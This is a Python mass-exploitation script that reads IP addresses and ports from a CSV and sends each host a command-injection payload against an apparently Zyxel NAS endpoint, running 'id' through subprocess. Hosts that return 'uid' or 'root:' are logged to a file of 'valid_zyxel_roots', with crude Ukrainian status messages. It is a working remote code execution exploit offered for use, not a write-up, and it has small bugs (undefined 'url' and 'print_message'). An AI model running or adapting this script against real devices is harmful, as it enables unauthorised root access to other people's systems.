import requests
import pandas as pd 
import sys 

file_path = sys.argv[1]
df = pd.read_csv(file_path)


def main():
    for index , row in df.iterrows():
        ip = row["ip"]
        port = row["port"]
        path = "/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+"+"and+False+or+__import__(\"subprocess\").check_output(\"id\",+shell=True)%23"
        vuln_url = f"https://{ip}:{port}"+ path 
        body = get_request(vuln_url)

        try:
            body = get_request(vuln_url)
            if body is not None and ('uid' in body or 'root:' in body):
                print(f"[+] Таргет {ip} виїбаний ....")
                print(body)
                write_to_file(f"https://{ip}:{port}{body}" , body)
            else:
                print(f"[-] Таргет {ip} не можна виїбати....")
        except requests.RequestException as e:
            print_message('Помилка', f"Timeout: {url}")


def get_request(vuln_url):
    try:
        response = requests.get(url=vuln_url , verify=False , timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except requests.RequestException as e:
        return None

def write_to_file(credsStr , body ):
    try:
        with open("valid_zyxel_roots.txt", 'a') as file:
            file.write(credsStr + '\n')
            file.write(body +'\n')
            print("[+] Хост додано у файл | " + credsStr)

    except FileNotFoundError:
        with open("valid_creds_ru_ssh", 'w') as file:
            file.write(credsStr)
            print("[+] Файл створено , хост доданий | " + credsStr)


if __name__ == "__main__":
    main()